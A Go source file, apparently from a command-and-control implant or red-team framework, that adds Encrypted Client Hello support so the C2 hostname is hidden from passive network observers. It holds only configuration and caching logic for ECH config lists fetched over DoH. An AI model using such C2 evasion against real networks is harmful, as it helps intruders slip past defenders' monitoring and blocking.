package transport

// ECH (Encrypted Client Hello) support for the C2 TLS client, adapted from
// sing-box's ECH client (common/tls/ech.go). ECH is only useful when the TLS
// endpoint holding the ECH private key is a CDN edge in front of the C2: it
// encrypts the inner SNI so a passive observer cannot read (and block on) the
// C2 hostname. The ECHConfigList is published in the domain's DNS HTTPS RR and
// is fetched over DoH, so ECH also requires a DoH resolver.
//
// The feature can be compiled out with the "no_ech" tag (or "no_doh", on which
// it depends); the fetch/cache implementation lives in ech.go and the disabled
// stub in ech_stub.go.

import (
	"strings"
	"sync"
	"time"
)

type echState struct {
	mu         sync.Mutex
	serverName string
	dohURL     string
	configList []byte
	ttl        time.Duration
	fetchedAt  time.Time
}

var ech = &echState{}

// SetECHConfig configures ECH for C2 TLS. serverName is the DNS name whose
// HTTPS RR carries the ECHConfigList; dohURL is the DoH resolver used to fetch
// it. An empty serverName disables ECH. It is safe to call from config load.
func SetECHConfig(serverName, dohURL string) {
	ech.mu.Lock()
	defer ech.mu.Unlock()
	ech.serverName = strings.TrimSpace(serverName)
	ech.dohURL = strings.TrimSpace(dohURL)
	ech.configList = nil
	ech.ttl = 0
	ech.fetchedAt = time.Time{}
}

// ECHEnabled reports whether an ECH query name is configured. It is used to
// pick a ClientHello preset that uTLS can wrap in ECH.
func ECHEnabled() bool {
	ech.mu.Lock()
	defer ech.mu.Unlock()
	return ech.serverName != ""
}

// freshLocked reports whether the cached ECHConfigList is still within its DNS
// TTL. Callers must hold ech.mu.
func (e *echState) freshLocked() bool {
	return len(e.configList) > 0 && e.ttl > 0 && time.Since(e.fetchedAt) <= e.ttl
}

// recordECHRetry caches an ECHConfigList the server offered after rejecting
// ECH, so the retry handshake and subsequent connections use it.
func recordECHRetry(list []byte) {
	if len(list) == 0 {
		return
	}
	ech.mu.Lock()
	ech.configList = append([]byte(nil), list...)
	// A server-provided retry list is authoritative; refresh it from DNS soon.
	ech.ttl = 5 * time.Minute
	ech.fetchedAt = time.Now()
	ech.mu.Unlock()
}
